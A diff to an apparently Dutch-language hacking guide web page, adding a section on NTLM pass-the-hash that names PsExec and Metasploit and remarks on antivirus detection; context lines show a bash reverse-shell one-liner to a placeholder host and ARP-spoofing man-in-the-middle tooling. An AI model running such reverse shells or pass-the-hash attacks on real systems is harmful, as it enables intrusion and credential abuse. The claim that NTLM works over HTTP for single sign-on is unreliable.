@@ -757,6 +757,11 @@ bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
 </blockquote>
 <p>naar het MAC adres van computer A. Op onze eigen computer zorgen wij ervoor dat wij de binnengekomen pakketten ook opnieuw verzenden naar de goede computer zodat het netwerk blijft draaien, en je hebt een Man in the Middle positie bemachtigd.</p>
 <p>Tooling: Arpspoof, ettercap, bettercap </p>
+<h2 id="pash-the-hash">Pash the hash</h2>
+<p>In Windows domeinen kan er gebruikt worden van NTLM (NT Lan Manager) authenticatie. Dit is een authenticatiemethode die gebruikt maakt van het HTTP protocol om een single sign-on mogelijkheid te maken.</p>
+<p>Bij pass the hash maak je gebruik van dit protocol om jezelf te authenticeren als een ander. Alhoewel wachtwoorden nooit ongehashed over het netwerk zullen gaan, en je dus niet zomaar als een ander kan inloggen als je naar zijn computer loopt, worden hashes wel over het netwerk verzonden. Aangezien een gebruiker zichzelf bij diensten (shares etc.) aanmeld met deze hash kan je die hergebruiken.</p>
+<p>Geavanceerde hacktools om pash the hash mee te doen? PSExec <a href="https://docs.microsoft.com/en-us/sysinternals/">Windows Sysinternals</a> of de vergelijkbare variant van Metasploit. Let wel op, de ene variant laat eerder een virusscanner af gaan dan de ander.</p>
+<h1 id="binary-exploitation">Binary exploitation</h1>
 <h1 id="dankwoord">Dankwoord</h1>
 <p>Github bedankt voor het hosten :)</p>
 <!-- Global site tag (gtag.js) - Google Analytics -->
